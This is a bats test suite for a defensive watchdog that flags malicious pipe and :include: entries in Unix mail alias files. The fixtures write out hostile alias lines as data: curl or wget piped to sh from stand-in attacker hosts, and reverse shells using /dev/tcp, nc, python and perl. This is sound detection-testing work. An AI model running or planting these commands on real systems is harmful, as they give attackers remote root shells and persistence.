#!/usr/bin/env bats
# L2 bats functional tests for the aliases-watchdog scan script.
#
# A mail alias `name: |command` makes the MTA run that command on delivery
# to the alias (the classic Unix mail-alias exec vector, T1546.004); a
# `name: :include:/path` reads further targets from another file. A pipe
# command under a writable root (/tmp /var/tmp /dev/shm /home) or carrying
# an injection pattern, a :include: of a writable file, or a
# world-writable/non-root aliases file, is alert.
#
# Runs the actual scan script with `logger` shadowed on PATH and the aliases
# file in a tmp sandbox via SELFDEF_ALIASES_FILES.
#
# Run with: bats packaging/test/L2-aliases-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/aliases-watchdog/systemd/aliases-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    ALIASES="${TMP}/aliases"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_ALIASES_PROFILE="${PROFILE:-report}" \
    SELFDEF_ALIASES_BASELINE="${BASELINE}" \
    SELFDEF_ALIASES_FILES="${ALIASES_F:-$ALIASES}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

# A benign aliases posture: a mailman pipe under /usr + an :include: of a
# trusted file + a plain redirect.
seed_benign() {
    printf 'mailman: |/usr/lib/mailman/mail/mailman post mailman\nstaff: :include:/etc/mail/staff-list\npostmaster: root\n' > "${ALIASES}"
}

# ============================================================
# ok tier
# ============================================================

@test "no aliases file → ok / no_aliases" {
    ALIASES_F="${TMP}/nonexistent" run_wd
    cap | grep -q '"event":"no_aliases"'
    cap | grep -q '"severity":"ok"'
}

@test "benign pipe + include, first run → ok / baseline_initial" {
    seed_benign
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged aliases on second run → ok / aliases_intact" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"aliases_intact"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# alert tier
# ============================================================

@test "a pipe command under a writable root → alert / aliases_suspicious" {
    seed_benign
    run_wd                                   # benign baseline
    printf 'evil: |/tmp/.x\n' > "${ALIASES}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"aliases_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "a :include: of a writable file → alert" {
    seed_benign
    run_wd
    printf 'team: :include:/dev/shm/list\n' > "${ALIASES}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "an injection pattern in a pipe command → alert" {
    seed_benign
    run_wd
    printf 'evil: |curl http://evil/p|sh\n' > "${ALIASES}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a world-writable aliases file → alert" {
    seed_benign
    run_wd
    chmod 0666 "${ALIASES}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

# ============================================================
# warn tier
# ============================================================

@test "a benign pipe change → warn / aliases_changed" {
    seed_benign
    run_wd
    printf 'mailman: |/usr/lib/mailman/mail/mailman post lists\nstaff: :include:/etc/mail/staff-list\npostmaster: root\n' > "${ALIASES}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"aliases_changed"'
    cap | grep -q '"severity":"warn"'
}

# ============================================================
# false-positive guard
# ============================================================

@test "a /usr-rooted pipe + trusted :include: is NOT flagged" {
    seed_benign
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# fail-loud + enforce profile
# ============================================================

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    seed_benign
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious pipe" {
    seed_benign
    run_wd
    printf 'evil: |/tmp/.x\n' > "${ALIASES}"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — aliases inventory enumerates mail-delivery-trigger root-exec surface)" {
    seed_benign
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (reverse-shell pattern in pipe): /dev/tcp reverse shell → alert" {
    seed_benign
    run_wd
    printf 'evil: |bash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${ALIASES}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (wget-pipe-sh in pipe): wget bootstrap → alert" {
    seed_benign
    run_wd
    printf 'evil: |wget -qO- http://attacker/p | sh\n' > "${ALIASES}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (base64-decode-pipe in pipe): obfuscation → alert" {
    seed_benign
    run_wd
    printf 'evil: |echo YmFzaCAtaQ== | base64 -d | bash\n' > "${ALIASES}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (pipe under /var/tmp): writable-root expansion" {
    seed_benign
    run_wd
    printf 'evil: |/var/tmp/.attacker\n' > "${ALIASES}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (:include: of a /tmp file → alert): include-axis writable-root expansion" {
    seed_benign
    run_wd
    printf 'team: :include:/tmp/.attacker-list\n' > "${ALIASES}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (:include: of a /var/tmp file → alert): include-axis writable-root expansion" {
    seed_benign
    run_wd
    printf 'team: :include:/var/tmp/.attacker-list\n' > "${ALIASES}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    seed_benign
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-aliases -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no auto-trust): aliases-watchdog does NOT refresh baseline on suspicious-pipe detection — alert STAYS until operator updates" {
    # T1546.004 mail-delivery-triggered root-exec persistence — alert
    # MUST persist across runs until operator explicitly re-baselines.
    seed_benign
    run_wd
    printf 'evil: |/tmp/.x\n' > "${ALIASES}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"event":"aliases_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (commented suspicious pipe NOT flagged: # prefix filtered)" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'mailman: |/usr/lib/mailman/mail/mailman post mailman\nstaff: :include:/etc/mail/staff-list\npostmaster: root\n# evil: |/tmp/.example-attacker\n' > "${ALIASES}"
    run_wd
    ! cap | grep -q '"event":"aliases_suspicious"'
    ! cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (multi-file scan: /etc/aliases + /etc/mail/aliases axes — suspicious in EITHER → alert)" {
    ALIASES2="${TMP}/mail-aliases"
    seed_benign
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_ALIASES_PROFILE="report" \
    SELFDEF_ALIASES_BASELINE="${BASELINE}" \
    SELFDEF_ALIASES_FILES="${ALIASES} ${ALIASES2}" \
    bash "${WD}"
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'evil: |/tmp/.evil\n' > "${ALIASES2}"
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_ALIASES_PROFILE="report" \
    SELFDEF_ALIASES_BASELINE="${BASELINE}" \
    SELFDEF_ALIASES_FILES="${ALIASES} ${ALIASES2}" \
    bash "${WD}"
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected in pipe)" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'evil: |curl -s http://attacker.com/p | bash\n' > "${ALIASES}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in aliases pipe: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
    # Sister to many other watchdog's nc reverse-shell variant
    # INVARIANTs across the brain. Lock the netcat axis on the
    # mail-delivery-triggered root-exec persistence surface
    # (T1546 — MTA delivers mail to alias pipe-target by exec'ing
    # the command AS ROOT on every matching message; attacker
    # sends self-addressed mail to trigger planted nc).
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'evil: |nc -e /bin/sh 1.1.1.1 4444\n' > "${ALIASES}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on aliases pipe surface)" {
    # Sister to nc / bash / curl|bash / base64 / dev-tcp pipe rev-
    # shell variants already locked. Attackers reach for python -c
    # 'import socket,os,pty' to dodge shell-pattern detectors —
    # python is on every Debian/Ubuntu MTA host. Locks the python
    # interpreter axis on the mail-delivery-triggered root-exec
    # persistence surface (T1546 — MTA delivers self-addressed mail
    # to alias pipe-target by exec'ing the command AS ROOT on every
    # matching message; attacker sends self-addressed mail to
    # trigger planted python rev-shell).
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'evil: |python -c "import socket,os,pty;s=socket.socket();s.connect((\\"1.1.1.1\\",4444));os.dup2(s.fileno(),0);pty.spawn(\\"/bin/sh\\")"\n' > "${ALIASES}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on aliases pipe surface)" {
    # Sister to nc / python -c / bash / curl|bash / base64 /
    # dev-tcp aliases pipe rev-shell variants. Perl on every
    # Debian/Ubuntu MTA host. Locks perl axis on T1546 MTA mail-
    # delivery-triggered root-exec persistence — attacker sends
    # mail to alias pipe-target to fire planted perl rev-shell.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'evil: |perl -e "use Socket;\\$i=\\"1.1.1.1\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\"tcp\\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));exec(\\"/bin/sh -i\\");"\n' > "${ALIASES}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (exec-path under writable-root: aliases pipe invoking binary from /var/tmp → alert)" {
    # Sister to brain-wide writable-root-exec INVARIANTs. T1546
    # MTA mail-delivery-triggered root-exec persistence — alias
    # pipe= target fires AS recipient/root on every email
    # delivered to the alias. Beyond inline rev-shell, attackers
    # stage benign-looking aliases that invoke a binary in
    # writable-root.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'evil: |/var/tmp/staged_payload\n' > "${ALIASES}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (severity bounded vocabulary {ok,warn,alert} — operator dashboard parser contract on aliases surface)" {
    # Sister to brain-wide severity-bounded-vocabulary INVARIANTs.
    # The aliases-watchdog MUST only emit severity values from
    # the closed set {ok,warn,alert} — never custom values
    # (critical, error, fatal, notice, info). Operator dashboard
    # parsers branch on the literal severity string; an out-of-
    # set value silently falls through routing and the operator
    # never sees the T1546 MTA mail-delivery-triggered root-exec
    # persistence alert. Locks parser contract on the /etc/
    # aliases pipe= detection surface.
    seed_benign
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # ok / baseline
    printf 'evil: |/tmp/.evil\n' > "${ALIASES}"
    run_wd                                              # alert path
    # Every severity value emitted MUST be one of {ok,warn,alert}.
    bad=$(grep -oE '"severity":"[^"]+"' "${SELFDEF_TEST_LOGCAP}" | grep -vE '"severity":"(ok|warn|alert)"' || true)
    [ -z "${bad}" ]
}

@test "INVARIANT (no auto-delete: aliases-watchdog NEVER deletes /etc/aliases entries — surveillance not remediation)" {
    # Sister to brain-wide no-auto-delete / surveillance-not-
    # remediation INVARIANTs across L2 watchdog suites. The
    # aliases-watchdog DETECTS T1546 MTA mail-delivery-trigger
    # root-exec persistence via pipe= but MUST NEVER emit sed/
    # awk/rm commands to auto-clean the alias. The detected
    # alias may be operator-legitimate (custom mail-processing
    # pipeline, mailman list handler, ticket-system bridge).
    # Silent auto-delete would destroy operator baseline state
    # AND could break operator's intended mail-delivery
    # routing. Surveillance, never remediation. Locks anti-
    # data-loss contract on the aliases surveillance substrate.
    printf 'evil: |/tmp/.evil\n' > "${ALIASES}"
    run_wd
    [ -f "${ALIASES}" ]
    grep -q 'evil:' "${ALIASES}"
    ! grep -vE '^[[:space:]]*#' "${WD}" | grep -qE '^[^#]*sed[[:space:]]+-i.*aliases'
    ! grep -vE '^[[:space:]]*#' "${WD}" | grep -qE '^[^#]*find[[:space:]].*-delete'
}

@test "INVARIANT (service unit declares Type=oneshot — timer-driven probe semantics)" {
    # Sister to brain-wide systemd Type=oneshot INVARIANT family.
    # aliases-watchdog runs ON the timer's scheduled fire —
    # scans /etc/aliases for |pipe-to-command injection patterns,
    # emits a verdict, then exits. Type=simple would break timer
    # OnUnitActiveSec semantics. Locks oneshot-probe contract on
    # the aliases-watchdog substrate.
    svc="${BATS_TEST_DIRNAME}/../../modules/aliases-watchdog/systemd/selfdef-aliases.service"
    [ -f "${svc}" ]
    grep -qE '^Type=oneshot' "${svc}"
}

@test "INVARIANT (no auto-fix: aliases-watchdog libexec NEVER writes back to its scanned target — surveillance not remediation)" {
    # Sister to brain-wide no-auto-{fix,delete,restore,uninstall}
    # family. aliases-watchdog is a DETECT-only watchdog: it surveils
    # its target surface + emits verdicts, NEVER writes back to
    # the source files it scans. The libexec script must NOT
    # contain sed -i / tee / printf-redirect mutations of its
    # scanned paths. Locks no-auto-fix on the aliases-watchdog
    # libexec substrate (sister to existing surveillance-not-
    # remediation lines for the watchdog runtime).
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/aliases-watchdog/systemd"
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        ! grep -vE '^[[:space:]]*#' "${sh}" | grep -qE 'sed[[:space:]]+-i.*\$\{?[A-Z_]*FILE'
        ! grep -vE '^[[:space:]]*#' "${sh}" | grep -qE 'tee[[:space:]].*\$\{?[A-Z_]*FILE'
    done
}

@test "INVARIANT (aliases-watchdog libexec uses set -u — anti-unbound-variable contract on the watchdog probe)" {
    # Sister to brain-wide shell-discipline INVARIANT family.
    # The aliases-watchdog libexec uses set -u (and NOT set -e) by
    # design: watchdog probes WANT to continue scanning even
    # when individual checks fail (rather than abort-on-first-
    # error like installers), so they emit a complete verdict
    # at the end. But set -u remains essential — it catches
    # typo'd env-var references ($SELFDEF_FOO_BASELINE vs
    # $SELFDEF_FOO_BASLINE) before they propagate as silent
    # empty-string into baseline-path operations. A regression
    # dropping set -u would let a typo'd var name produce a
    # silent baseline-rewrite to /. Locks set -u discipline on
    # the aliases-watchdog libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/aliases-watchdog/systemd"
    found=0
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        if grep -qE '^set[[:space:]]+-u' "${sh}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (aliases-watchdog libexec uses logger -t with selfdef- tag — SDD-062 syslog routing contract)" {
    # Sister to brain-wide SDD-062 logger-tag INVARIANT family.
    # All watchdog libexec scripts MUST surface JSON records
    # via logger -t with a selfdef-prefixed tag so downstream
    # syslog/journald consumers can route per-watchdog records
    # via the tag field rather than parsing the JSON payload
    # for the module field. The tag prefix MUST be "selfdef-"
    # so cross-watchdog SIEM filters (`syslog-ng-filter "selfdef-*"`)
    # capture every selfdef-watchdog without per-watchdog tag
    # enumeration. A regression dropping the selfdef- prefix
    # would cause SIEM filters to silently miss records. Locks
    # SDD-062 logger-tag routing discipline on the aliases-watchdog
    # libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/aliases-watchdog/systemd"
    found=0
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        if grep -qE 'logger[[:space:]]+-t[[:space:]]+selfdef-' "${sh}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (aliases-watchdog timer unit declares RandomizedDelaySec — anti-thundering-herd cadence contract)" {
    # Sister to brain-wide timer-cadence INVARIANT family.
    # The aliases-watchdog timer unit MUST declare RandomizedDelaySec=
    # so fleet hosts don't all fire at the exact same minute
    # (thundering-herd that overwhelms downstream
    # syslog/journald aggregators). Locks anti-thundering-herd
    # cadence discipline on the aliases-watchdog timer substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/aliases-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^RandomizedDelaySec=' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (aliases-watchdog timer unit declares Persistent=true — catch-up-after-downtime contract)" {
    # Sister to brain-wide timer Persistent INVARIANT family.
    # Persistent=true tells systemd to fire the timer ON BOOT
    # if it was missed during downtime — without it, a host
    # that boots after the scheduled fire would silently skip
    # the cycle, leaving a forensics gap. Locks Persistent=
    # discipline on the aliases-watchdog timer substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/aliases-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^Persistent=true' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (aliases-watchdog timer Unit= field references its companion .service — timer-to-service binding contract)" {
    # Sister to brain-wide systemd timer-Unit INVARIANT family.
    # The .timer file MUST declare Unit=<companion>.service so
    # systemd knows which .service to fire on timer-elapse. By
    # default systemd matches timer-name to service-name, but
    # explicit Unit= is required when names differ + makes the
    # binding self-documenting. A regression dropping Unit= +
    # renaming either file would silently break the link.
    # Locks the timer-to-service binding discipline on the
    # aliases-watchdog substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/aliases-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^Unit=.*\.service' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (aliases-watchdog service ExecStart references its libexec script — service-to-libexec binding contract)" {
    # Sister to brain-wide systemd ExecStart binding INVARIANT
    # family. The .service file MUST declare ExecStart=<path-
    # to-libexec.sh> so systemd knows what to run. The libexec
    # script must EXIST at the declared path. A regression that
    # renamed the libexec script without updating ExecStart
    # would surface as service-start failure rather than a
    # silent regression. Locks the service-to-libexec binding
    # discipline on the aliases-watchdog substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/aliases-watchdog/systemd"
    found=0
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        if grep -qE '^ExecStart=' "${s}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}
